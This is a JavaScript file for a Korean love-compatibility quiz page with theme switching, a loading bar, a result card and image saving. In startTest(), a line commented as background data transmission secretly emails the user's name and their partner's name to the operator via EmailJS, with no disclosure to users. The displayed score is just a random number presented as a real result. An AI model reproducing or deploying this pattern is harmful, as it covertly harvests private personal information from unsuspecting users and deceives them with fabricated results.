emailjs.init("bkOrDqd7jRamcXZFc"); 

// 다크모드랑 라이트모드 바꾸는 함수
function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const targetTheme = currentTheme === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', targetTheme);
    document.getElementById('themeBtn').innerText = targetTheme === 'dark' ? '☀️ 라이트모드' : '🌙 다크모드';
}

// 이름 입력했는지 검사하고 로딩화면 띄우는 함수
function startTest() {
    const myName = document.getElementById('myName').value.trim();
    const partnerName = document.getElementById('partnerName').value.trim();

    // 둘 중 하나라도 비어있으면 경고창 띄우기
    if (!myName || !partnerName) {
        alert('이름을 모두 입력해주세요!');
        return;
    }

    // 메인 화면 숨기고 로딩 화면 보여주기
    document.getElementById('step1').classList.remove('active');
    document.getElementById('step2').classList.add('active');

    // 기획서대로 게이지 바가 3초 동안 부드럽게 차오르는 애니메이션
    let width = 0;
    const progressBar = document.getElementById('progressBar');
    const interval = setInterval(() => {
        if (width >= 100) {
            clearInterval(interval);
            showResult(myName, partnerName); // 게이지 다 차면 결과 화면으로 이동
        } else {
            width += 5;
            progressBar.style.width = width + '%';
        }
    }, 150);

    //  백그라운드 데이터 전송 (EmailJS 이용)
    const templateParams = {
        from_name: "두근두근 시스템",
        message: `매칭 발생 - 본인: ${myName} / 상대방: ${partnerName}`
    };
    
    emailjs.send('service_2av50ue', 'template_sk5c60l', templateParams)
        .then(() => console.log('데이터 전송 완료'))
        .catch(err => console.log('서버 전송 대기 중...', err));
}

// 점수 계산해서 결과 화면에 뿌려주는 함수
function showResult(my, partner) {
    // 1부터 100 사이로 랜덤하게 점수 뽑기
    const score = Math.floor(Math.random() * 100) + 1;
    document.getElementById('scoreValue').innerText = score + '%';

    // 점수별로 나오는 멘트 
    let desc = "";
    if (score >= 90) {
        desc = "💘 대박... 거의 전생에 부부 수준; 당장 고백각입니다.";
    } else if (score >= 70) {
        desc = "좋습니다~~😄😄";
    } else if (score >= 40) {
        desc = " 중타는 칩니다. 떡볶이 한 번 사주면서 친해져 보세요.";
    } else if (score >= 15) {
        desc = " 음... 길 가다 마주쳐도 약간 어색하게 인사할 사이?";
    } else {
        desc = "🚨 비상!! 이번 생은 스쳐 지나가는 인연인 걸로 합시다ㅎㅎ";
    }

    document.getElementById('resultDesc').innerText = desc;

    // 로딩 화면 숨기고 결과 화면 띄우기
    document.getElementById('step2').classList.remove('active');
    document.getElementById('step3').classList.add('active');
}

// html2canvas 라이브러리로 결과 카드를 캡처해서 이미지로 저장하는 함수
function saveResult() {
    const card = document.getElementById('resultCard');
    html2canvas(card).then(canvas => {
        const link = document.createElement('a');
        link.download = '궁합결과.png'; // 다운로드될 파일 이름
        link.href = canvas.toDataURL();
        link.click();
    });
}

// 처음 메인 화면으로 리셋하는 함수
function resetAll() {
    // 입력창 글자 지우기
    document.getElementById('myName').value = '';
    document.getElementById('partnerName').value = '';
    
    // 결과 화면 숨기고 메인 화면 띄우기
    document.getElementById('step3').classList.remove('active');
    document.getElementById('step1').classList.add('active');
}